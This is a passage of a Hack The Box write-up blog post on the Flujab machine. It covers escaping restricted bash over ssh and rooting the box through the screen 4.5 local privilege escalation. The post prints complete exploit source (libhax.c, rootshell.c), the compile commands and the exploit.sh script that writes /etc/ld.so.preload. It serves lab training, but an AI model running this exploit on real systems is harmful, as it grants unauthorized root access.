<h2 id="Bypassing-restricted-bash-Local-Privilege-Escalation-Vulnerability-in-screen-Root-Flag"><a href="#Bypassing-restricted-bash-Local-Privilege-Escalation-Vulnerability-in-screen-Root-Flag" class="headerlink" title="Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag"></a>Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag</h2><p>After getting ssh access I found myself in <code>rbash</code> :<br><img src="/images/hackthebox/flujab/105.png" alt=""><br>After trying some stuff I could bypass it by adding the <code>-t</code> option when trying to ssh :<br><code>ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t &quot;bash --noprofile&quot;</code><br><img src="/images/hackthebox/flujab/106.png" alt=""><br>Then I had to fix my path :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/flujab/107.png" alt=""><br>I did some regular enumeration steps, one of them is searching for <code>suid</code> binaries :<br><code>find / -perm -4000 2&gt;/dev/null</code><br><img src="/images/hackthebox/flujab/108.png" alt=""><br>One thing that caught my attention was <code>/usr/local/share/screen/screen</code><br>I checked the version of <code>screen</code> :<br><code>screen -v</code> :<br><img src="/images/hackthebox/flujab/109.png" alt=""><br>It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it <a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="noopener">here</a>. However by looking at that exploit :<br><img src="/images/hackthebox/flujab/110.png" alt=""><br>We can see that it’s compiling stuff. And unfortunately <code>gcc</code> wasn’t installed on the machine :<br><img src="/images/hackthebox/flujab/111.png" alt=""><br>So I had to remove the <code>c</code> code from the exploit and create separate files. Then I compiled them.<br><code>libhax.c</code> :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>rootshell.c</code> :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compilation :<br><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
<p><code>gcc -o rootshell rootshell.c</code><br><code>exploit.sh</code> : </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
<p>I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :<br><img src="/images/hackthebox/flujab/112.png" alt=""><br>But when I ran the exploit it didn’t spawn a root shell :<br><img src="/images/hackthebox/flujab/113.png" alt=""><br>That’s because I forgot that the <code>suid</code> version of <code>screen</code> was in <code>/usr/local/share/screen/screen</code>. The other one had problems and didn’t even start :<br><img src="/images/hackthebox/flujab/114.png" alt=""><br>So I edited the path in the exploit code :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">/usr/<span class="built_in">local</span>/share/screen/screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">/usr/<span class="built_in">local</span>/share/screen/screen -ls </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/flujab/116.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/help/">Hack The Box - Help</a><br>Next Hack The Box write-up : <a href="/hack-the-box/querier/">Hack The Box - Querier</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-06-15</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/binary-exploitation/" rel="tag">#binary-exploitation</a> <a class="tag-link" href="/tags/c/" rel="tag">#c</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/rbash/" rel="tag">#rbash</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#sqli</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
